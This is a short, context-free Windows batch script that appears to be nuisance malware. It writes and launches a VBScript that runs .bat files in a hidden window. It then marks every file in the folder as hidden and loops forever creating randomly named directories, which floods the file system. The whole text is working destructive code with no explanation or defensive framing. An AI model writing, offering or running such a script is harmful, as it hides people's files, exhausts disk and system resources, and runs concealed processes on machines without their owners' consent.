echo set objShell = CreateObject("WScript.Shell") >> winstart.vbs
echo objShell.Run "*.bat", vbHide, TRUE >> winstart.vbs
start "" "winstart.vbs"
attrib +h *.*
:x
md %random%
goto x
